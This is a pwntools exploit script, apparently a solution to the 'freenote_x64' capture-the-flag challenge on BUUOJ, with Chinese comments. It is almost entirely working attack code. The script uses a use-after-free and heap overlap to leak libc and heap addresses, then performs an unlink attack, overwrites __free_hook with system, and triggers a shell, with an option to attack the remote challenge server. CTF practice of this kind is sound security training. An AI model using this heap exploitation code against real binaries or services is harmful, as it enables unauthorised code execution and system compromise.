# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './freenote_x64'
elf = ELF(binary)
#libc = elf.libc
libc = ELF('./libc-2.23.so')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28438'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x)[2:] , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    while 1 :
        try:
            pwn()
        except:
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def show():
    cmd(1)

def add(size,text):
    cmd(2)
    sla("new note: ",size)
    sla("your note: ",text)

def edit(id,size,text):
    cmd(3)
    sla("Note number: ",id)
    sla("of note: ",size)
    sa("your note: ",text)

def delete(id):
    cmd(4)
    sla("Note number: ",id)

one_gad = one_gadget(libc.path)

# 本题有 uaf 洞，但只能 delete ，可以不断 free 相同地址的不同状态的堆块

add(0x80,"a"*0x80)
add(0x80,"a"*0x80)
add(0x80,"a"*0x80)
add(0x80,"a"*0x80)

delete(1)
delete(2)

dbg()

edit(0,0x90,'a'*0x90)
# realloc再分配，大小大于原堆块，先释放原堆块，再分配
# 此时释放就会与后面的 unsortedbin 合并
# 分配时切割 0x110大小 刚好写 0x90 字节可以覆盖到 main_arena 指针上方

show()

__malloc_hook = l64() - 0x68
libc.address = __malloc_hook - libc.sym["__malloc_hook"]
__free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
binsh = libc.search('/bin/sh').next()

fake_chunk = p64(0) + p64(0x21)
fake_chunk += 'a'*0x10

payload = 'a'*0x80
payload += fake_chunk*2
payload = payload.ljust(0x118,'a')
#3的size的prev_inuse设置为1，因为unlink时要检查
payload += p64(0x21)
payload = payload.ljust(0x180,'a')

edit(0,0x180,payload)
# 此时因为 realloc 再申请 unsortedbin 只剩下0x20大小，会放入fastbin

delete(1)
# 此处为伪造的 fastbin fackchunk 堆块，可再释放泄露出堆地址

edit(0,0x90,'a'*0x90)
# dbg()
show()

ru("a"*0x90)
heap_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
ptr_addr = heap_addr - 0x1980

# 通过 uaf 来 unlink
lg("ptr_addr",ptr_addr)

fake_chunk = p64(0) + p64(0x81)
fake_chunk += p64(ptr_addr - 0x18) + p64(ptr_addr - 0x10)
payload = fake_chunk.ljust(0x80,'a')

#上面一半为chunk0 ，下面一半为chunk1
chunk_head = p64(0x80) + p64(0x90)
payload += chunk_head
payload = payload.ljust(0x100,'a')
edit(0,0x100,payload)

delete(1)
#触发unlink ，此时的 1 已经有合法的 chunk 头

payload = p64(10)
payload += p64(1) + p64(0x8) + p64(__free_hook)
payload += p64(1) + p64(0x8) + p64(binsh)
payload = payload.ljust(0x100,'\x00')
edit(0,0x100,payload)

edit(0,8,p64(system))
delete(1)
#dbg()

p.interactive()

'''
@File    :   freenote_x64.py
@Time    :   2021/08/16 10:56:25
@Author  :   Niyah 
'''
